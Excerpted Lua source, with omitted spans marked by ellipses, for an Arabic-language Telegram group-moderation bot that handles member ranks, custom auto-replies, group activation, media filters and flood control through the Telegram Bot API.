elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(SAKO..'Rio:Admins:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
DevRio:srem(SAKO..'Rio:Managers:'..msg.chat_id_, result.sender_user_id_)
DevRio:del(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..DEV_RIO..' ❩ بنجاح', 1, 'md')
end
...
if DevRio:sismember(SAKO.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrrio = DevRio:get(SAKO.."Comd:New:rt:Rio:"..text1[2]..msg.chat_id_)
if mrrio == "مميز" and VipMem(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(SAKO..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:set(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(SAKO..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:set(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:sadd(SAKO..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:set(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:srem(SAKO..'Rio:VipMem:'..msg.chat_id_, result.id_)
DevRio:del(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "ادمن" and Admin(msg) then 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(SAKO..'Rio:Admins:'..msg.chat_id_, result.id_)
DevRio:del(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "مدير" and Manager(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
DevRio:srem(SAKO..'Rio:Managers:'..msg.chat_id_, result.id_)
DevRio:del(SAKO.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrrio == "عضو" then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'L9L9L')..')'..' ❩\n᥀︙تم تنزيله ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
end
...
DevRio:incr(SAKO..'Rio:UsersMsgs'..SAKO..os.date('%d')..':'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:incr(SAKO..'Rio:MsgNumberDay'..msg.chat_id_..':'..os.date('%d'))  
ChatType = 'sp' 
elseif id:match("^(%d+)") then
if not DevRio:sismember(SAKO.."Rio:Users",msg.chat_id_) then
DevRio:sadd(SAKO.."Rio:Users",msg.chat_id_)
end
ChatType = 'pv' 
else
ChatType = 'gp' 
...
if not DevRio:get(SAKO..'Rio:Start:Time'..msg.sender_user_id_) then
...
local start = DevRio:get(SAKO.."Rio:Start:Bot")
if start then 
Start_Source = start
else
...
DevRio:setex(SAKO..'Rio:Start:Time'..msg.sender_user_id_,300,true)
return false
end 
--     Source SAKO     --
if not SecondSudo(msg) and not DevRio:sismember(SAKO..'Rio:Ban:Pv',msg.sender_user_id_) and not DevRio:get(SAKO..'Rio:Texting:Pv') then
...
DevRio:sadd(SAKO..'Rio:Ban:Pv',data.id_)  
return false  
end 
if text == 'الغاء الحظر' or text == 'الغاء حظر' then
local Text = '᥀︙العضو ↫ ['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..data.id_..')'..'\n᥀︙تم الغاء حظره من التواصل'
SendText(DevId,Text,msg.id_/2097152/0.5,'md') 
DevRio:srem(SAKO..'Rio:Ban:Pv',data.id_)  
return false  
end 
...
--     Source SAKO     --
if text and DevRio:get(SAKO..'Rio:Start:Bots'..msg.sender_user_id_) then
if text == 'الغاء' then   
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ كليشة الستارت', 1, 'md')
DevRio:del(SAKO..'Rio:Start:Bots'..msg.sender_user_id_) 
return false
end
DevRio:set(SAKO.."Rio:Start:Bot",text)  
...
DevRio:set(SAKO..'Rio:Start:Bots'..msg.sender_user_id_,true) 
...
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تفعيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:del(SAKO..'Rio:Texting:Pv') 
end
if text == 'تعطيل التواصل' and ChCheck(msg) or text == '↫ تعطيل التواصل ᥀' and ChCheck(msg) then  
local SAKOTeam = '᥀︙اهلا عزيزي ↫ '..RioRank(msg)..' \n᥀︙تم تعطيل التواصل بنجاح'
riomoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SAKOTeam, 14, string.len(msg.sender_user_id_))
DevRio:set(SAKO..'Rio:Texting:Pv',true) 
end
if Sudo(msg) then
...
DevRio:del(SAKO.."Rio:Lock:AutoFile")
end
...
DevRio:set(SAKO.."Rio:Lock:AutoFile",true) 
end
end
end
--     Source SAKO     --
...
local SAKOTeam = {'- Nothing stops him who wants you .','make them wish they had you !.','Maybe a magical girl','٫ 𝖡𝖾 𝗌𝗂𝗆𝗉𝗅𝖾 𝖺𝗇𝖽 𝖽𝗂𝖿𝖿𝖾𝗋𝖾𝗇𝗍','. 𝖬𝖺𝗄𝖾 𝖽𝗋𝖾𝖺𝗆𝗌 𝖿𝗋𝗈𝗆 𝗒𝗈𝗎𝗋 𝗋𝖾𝖿𝗋𝖺𝖼𝗍𝗂𝗈𝗇𝗌 . .',':Life is lying .','𝖨 𝗐𝗂𝗅𝗅 𝖺𝗅𝗐𝖺𝗒𝗌 𝗅𝗈𝗏𝖾 𝗒𝗈𝗎 𝗇𝖾𝗏𝖾𝗋 𝖿𝗈𝗋𝗀𝖾𝗍'}  
Dev_Rio(msg.chat_id_, msg.id_, 1, ''..SAKOTeam[math.random(#SAKOTeam)]..'' , 1, 'md')  
return false
end
--     Source SAKO     --
...
local my_ph = DevRio:get(SAKO.."Rio:Photo:Profile"..msg.chat_id_)
if not my_ph then
...
if not DevRio:get(SAKO..'Rio:Lock:Gamesinline'..msg.chat_id_) then
Text =[[
...
DevRio:incr(SAKO..'Rio:ContactNumber'..msg.chat_id_..':'..msg.sender_user_id_)
DevRio:set(SAKO.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = DevRio:get(SAKO.."Rio:Lock:Bots"..msg.chat_id_) 
for i=0,#mem_id do  
...
DevRio:sadd(SAKO..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_)
GetInfo = https.request("https://api.telegram.org/bot"..TokenBot.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local JsonInfo = JSON.decode(GetInfo)
if JsonInfo.ok == true and #mem_id == i then
local Msgs = {}
...
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(SAKO) then 
DevRio:srem(SAKO.."Rio:Groups", msg.chat_id_) 
...
if DevRio:get(SAKO..'Rio:Lock:TagServr'..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
end   
end
if msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" then   
DevRio:incr(SAKO..'Rio:EntryNumber'..msg.chat_id_..':'..os.date('%d'))  
elseif msg.content_.ID == "MessageChatDeleteMember" then   
DevRio:incr(SAKO..'Rio:ExitNumber'..msg.chat_id_..':'..os.date('%d'))  
end
--     Source SAKO     --
if text ==('تفعيل') and not SudoBot(msg) and ChCheck(msg) then
if not DevRio:get(SAKO..'Rio:Lock:FreeBot'..SAKO) then
if ChatType == 'pv' then
...
DevRio:sadd(SAKO..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(SAKO..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)   
else
DevRio:sadd(SAKO..'Rio:Admins:'..msg.chat_id_, admins[i].user_id_)
...
DevRio:sadd(SAKO.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:sadd(SAKO.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevRio:srem(SAKO.."Rio:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevRio:srem(SAKO.."Rio:RioConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevRio:sismember(SAKO..'Rio:Groups',msg.chat_id_) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙المجموعه بالتاكيد مفعله', 1, 'md')
else
if tonumber(data.member_count_) < tonumber(DevRio:get(SAKO..'Rio:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙عدد اعضاء المجموعه اقل من ↫ *'..(DevRio:get(SAKO..'Rio:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
ReplyStatus(msg,result.id_,"ReplyBy","᥀︙تم تفعيل المجموعه "..dp.title_)  
DevRio:sadd(SAKO.."Rio:Groups",msg.chat_id_)
DevRio:sadd(SAKO..'Rio:BasicConstructor:'..msg.chat_id_,msg.sender_user_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
...
DevRio:set(SAKO.."Rio:Groups:Links"..msg.chat_id_,LinkGroup) 
...
DevRio:set(SAKO..'Save:UserName'..msg.sender_user_id_,data.username_)
end;end,nil) 
--     Source SAKO     --
local ReFalse = tostring(msg.chat_id_)
if not DevRio:sismember(SAKO.."Rio:Groups",msg.chat_id_) and not ReFalse:match("^(%d+)") and not SudoBot(msg) then
...
if DevRio:get(SAKO..'Rio:Lock:Robot'..msg.chat_id_) then
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..dp.id_)
DevRio:sadd(SAKO..'Rio:Tkeed:'..msg.chat_id_, dp.id_)
...
if DevRio:get(SAKO.."Rio:Lock:Join"..msg.chat_id_) then
...
if not Bot(msg) then 
local filter = DevRio:smembers(SAKO.."Rio:FilterPhoto"..msg.chat_id_)
...
if not Bot(msg) then 
local filter = DevRio:smembers(SAKO.."Rio:FilterAnimation"..msg.chat_id_)
for k,v in pairs(filter) do
...
if not Bot(msg) then 
local filter = DevRio:smembers(SAKO.."Rio:FilterSteckr"..msg.chat_id_)
for k,v in pairs(filter) do
...
local DelGpRedRedods = DevRio:get(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
local GetGpTexts = DevRio:get(SAKO..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedods == 'DelGpRedRedods' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الرد ↫ '..msg.content_.text_..' للكلمه ↫ '..GetGpTexts..' تم حذفها',  1, "html")
DevRio:del(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(SAKO..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRedod' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Text:GpTexts'..msg.content_.text_..msg.chat_id_)
DevRio:srem(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelGpRed = DevRio:get(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if DelGpRed == 'DelGpRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(SAKO..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
DevRio:srem(SAKO..'Rio:Manager:GpRed'..msg.chat_id_,msg.content_.text_)
return false
end
end
if text and text:match("^(.*)$") then
local DelAllRed = DevRio:get(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_)
if DelAllRed == 'DelAllRed' then
Dev_Rio(msg.chat_id_, msg.id_, 1,'᥀︙الكلمه ( '..msg.content_.text_..' ) تم حذفها',  1, "html")
DevRio:del(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(SAKO.."Rio:Gif:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:Voice:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:Audio:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:Photo:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:Stecker:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:Video:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:File:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:Text:AllRed"..msg.content_.text_)
DevRio:del(SAKO.."Rio:Sudo:AllRed",msg.content_.text_)
return false
end
end
--     Source SAKO     --
if text and text:match("^(.*)$") then
local SaveGpRedod = DevRio:get(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRedod == 'SaveGpRedod' then
local GetGpTexts = DevRio:get(SAKO..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
local List = DevRio:smembers(SAKO..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
if text == "الغاء" then 
Dev_Rio(msg.chat_id_, msg.id_, 1, "᥀︙᥀︙تم الغاء عملية حفظ الردود المتعدده للامر ↫ "..GetGpTexts ,  1, "md")
DevRio:del(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_)
DevRio:del(SAKO..'Rio:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_)
DevRio:srem(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_,GetGpTexts)
return false
end
Text = text:gsub('"',""):gsub('"',""):gsub("`",""):gsub("*","")
DevRio:sadd(SAKO..'Rio:Text:GpTexts'..GetGpTexts..msg.chat_id_,Text)
if #List == 4 then 
...
if text and not DevRio:get(SAKO..'Rio:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_) then
if DevRio:sismember(SAKO..'Rio:Manager:GpRedod'..msg.chat_id_,text) then
local SAKOTeam =  DevRio:smembers(SAKO..'Rio:Text:GpTexts'..text..msg.chat_id_)
Dev_Rio(msg.chat_id_, msg.id_, 1, '['..SAKOTeam[math.random(#SAKOTeam)]..']' , 1, 'md')  
end
end
--     Source SAKO     --
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then 
local SaveGpRed = DevRio:get(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SaveGpRed == 'SaveGpRed' then 
if text == 'الغاء' then
local DelManagerRep = DevRio:get(SAKO..'DelManagerRep'..msg.chat_id_)
DevRio:srem(SAKO..'Rio:Manager:GpRed'..msg.chat_id_,DelManagerRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(SAKO..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
DevRio:del(SAKO..'DelManagerRep'..msg.chat_id_)
return false
end
DevRio:del(SAKO..'Rio:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
local SaveGpRed = DevRio:get(SAKO..'Rio:Add:GpText'..msg.sender_user_id_..msg.chat_id_)
if msg.content_.video_ then DevRio:set(SAKO..'Rio:Video:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then DevRio:set(SAKO..'Rio:File:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then DevRio:set(SAKO..'Rio:Stecker:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_) 
end 
if msg.content_.voice_ then DevRio:set(SAKO..'Rio:Voice:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_) 
end
if msg.content_.audio_ then DevRio:set(SAKO..'Rio:Audio:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_) 
end
...
DevRio:set(SAKO..'Rio:Photo:GpRed'..SaveGpRed..msg.chat_id_, photo_in_group) 
end
if msg.content_.animation_ then DevRio:set(SAKO..'Rio:Gif:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_) 
end 
if msg.content_.text_ then
DevRio:set(SAKO..'Rio:Text:GpRed'..SaveGpRed..msg.chat_id_, msg.content_.text_)
end 
...
if msg.content_.text_ and not DevRio:get(SAKO..'Rio:Lock:GpRed'..msg.chat_id_) then 
if DevRio:get(SAKO..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(SAKO..'Rio:Video:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(SAKO..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(SAKO..'Rio:File:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(SAKO..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO..'Rio:Voice:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(SAKO..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO..'Rio:Audio:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(SAKO..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO..'Rio:Photo:GpRed'..msg.content_.text_..msg.chat_id_)) 
end
if DevRio:get(SAKO..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO..'Rio:Gif:GpRed'..msg.content_.text_..msg.chat_id_)) 
end 
if DevRio:get(SAKO..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_) then 
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(SAKO..'Rio:Stecker:GpRed'..msg.content_.text_..msg.chat_id_))
end
if DevRio:get(SAKO..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_) then
function SAKOTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(SAKO..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(SAKO..'Rio:Text:GpRed'..msg.content_.text_..msg.chat_id_)
...
getUser(msg.sender_user_id_, SAKOTeam)
end
end
--     Source SAKO     --
text = msg.content_.text_
if msg.content_.text_ or msg.content_.video_ or msg.content_.document_ or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.audio_ or msg.content_.photo_ or msg.content_.animation_ then
local SaveAllRed = DevRio:get(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_)
if SaveAllRed == 'SaveAllRed' then
if text == 'الغاء' then
local DelSudoRep = DevRio:get(SAKO..'DelSudoRep')
DevRio:del(SAKO.."Rio:Sudo:AllRed",DelSudoRep)
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم الغاء حفظ الرد', 1, 'md')
DevRio:del(SAKO.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_)
DevRio:del(SAKO.."DelSudoRep")
return false
end
DevRio:del(SAKO.."Rio:Add:AllRed"..msg.sender_user_id_)
local SaveAllRed = DevRio:get(SAKO.."Rio:Add:AllText"..msg.sender_user_id_)
if msg.content_.video_ then
DevRio:set(SAKO.."Rio:Video:AllRed"..SaveAllRed, msg.content_.video_.video_.persistent_id_)
end
if msg.content_.document_ then
DevRio:set(SAKO.."Rio:File:AllRed"..SaveAllRed, msg.content_.document_.document_.persistent_id_)
end
if msg.content_.sticker_ then
DevRio:set(SAKO.."Rio:Stecker:AllRed"..SaveAllRed, msg.content_.sticker_.sticker_.persistent_id_)
end
if msg.content_.voice_ then
DevRio:set(SAKO.."Rio:Voice:AllRed"..SaveAllRed, msg.content_.voice_.voice_.persistent_id_)
end
if msg.content_.audio_ then
DevRio:set(SAKO.."Rio:Audio:AllRed"..SaveAllRed, msg.content_.audio_.audio_.persistent_id_)
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
...
DevRio:set(SAKO.."Rio:Photo:AllRed"..SaveAllRed, photo_in_all_groups)
end
if msg.content_.animation_ then
DevRio:set(SAKO.."Rio:Gif:AllRed"..SaveAllRed, msg.content_.animation_.animation_.persistent_id_)
end
if msg.content_.text_ then
DevRio:set(SAKO.."Rio:Text:AllRed"..SaveAllRed, msg.content_.text_)
end 
Dev_Rio(msg.chat_id_, msg.id_, 1, '᥀︙تم حفظ الرد الجديد', 1, 'md') 
DevRio:del(SAKO.."Rio:Add:AllText"..msg.sender_user_id_)
DevRio:del(SAKO..'DelSudoRep')
return false end end
if msg.content_.text_ and not DevRio:get(SAKO..'Rio:Lock:AllRed'..msg.chat_id_) then
if DevRio:get(SAKO.."Rio:Video:AllRed"..msg.content_.text_) then
sendVideo(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(SAKO.."Rio:Video:AllRed"..msg.content_.text_))
end
if DevRio:get(SAKO.."Rio:File:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(SAKO.."Rio:File:AllRed"..msg.content_.text_))
end
if DevRio:get(SAKO.."Rio:Voice:AllRed"..msg.content_.text_)  then
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO.."Rio:Voice:AllRed"..msg.content_.text_))
end
if DevRio:get(SAKO.."Rio:Audio:AllRed"..msg.content_.text_)  then
sendAudio(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO.."Rio:Audio:AllRed"..msg.content_.text_))
end
if DevRio:get(SAKO.."Rio:Photo:AllRed"..msg.content_.text_)  then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO.."Rio:Photo:AllRed"..msg.content_.text_))
end
if  DevRio:get(SAKO.."Rio:Gif:AllRed"..msg.content_.text_) then
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, DevRio:get(SAKO.."Rio:Gif:AllRed"..msg.content_.text_))
end
if DevRio:get(SAKO.."Rio:Stecker:AllRed"..msg.content_.text_) then
sendSticker(msg.chat_id_, msg.id_, 0, 1,nil, DevRio:get(SAKO.."Rio:Stecker:AllRed"..msg.content_.text_))
end
if DevRio:get(SAKO.."Rio:Text:AllRed"..msg.content_.text_) then
function SAKOTeam(extra,result,success)
if result.username_ then username = '[@'..result.username_..']' else username = 'لا يوجد' end
local edit_msg = DevRio:get(SAKO..'Rio:EditMsg'..msg.chat_id_..msg.sender_user_id_) or 0
local user_msgs = DevRio:get(SAKO..'Rio:UsersMsgs'..msg.chat_id_..':'..msg.sender_user_id_)
local Text = DevRio:get(SAKO.."Rio:Text:AllRed"..msg.content_.text_)
local Text = Text:gsub('#username',(username or 'لا يوجد')) 
local Text = Text:gsub('#name','['..result.first_name_..']')
local Text = Text:gsub('#id',msg.sender_user_id_)
local Text = Text:gsub('#edit',edit_msg)
...
if Type == "keed" and not DevRio:sismember(SAKO..'Rio:Tkeed:'..msg.chat_id_, msg.sender_user_id_) then
...
if Type == "mute" and not DevRio:sismember(SAKO..'Rio:Muted:'..msg.chat_id_, msg.sender_user_id_) then
DevRio:sadd(SAKO..'Rio:Muted:'..msg.chat_id_,msg.sender_user_id_)
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
...
--     Source SAKO     --
--       Spam Check       --
if not VipMem(msg) and msg.content_.ID ~= "MessageChatAddMembers" and DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") then 
if msg.sender_user_id_ ~= SAKO then
floods = DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") or "nil"
Num_Msg_Max = DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5
Time_Spam = DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 5
local post_count = tonumber(DevRio:get(SAKO.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_) or 0)
if post_count > tonumber(DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") or 5) then 
local ch = msg.chat_id_
local type = DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Spam:User") 
NotSpam(msg,type)  
end
DevRio:setex(SAKO.."Rio:Spam:Cont"..msg.sender_user_id_..":"..msg.chat_id_, tonumber(DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam:Time") or 3), post_count+1) 
local edit_id = data.text_ or "nil"  
Num_Msg_Max = 5
if DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") then
Num_Msg_Max = DevRio:hget(SAKO.."Rio:Spam:Group:User"..msg.chat_id_,"Num:Spam") 
end
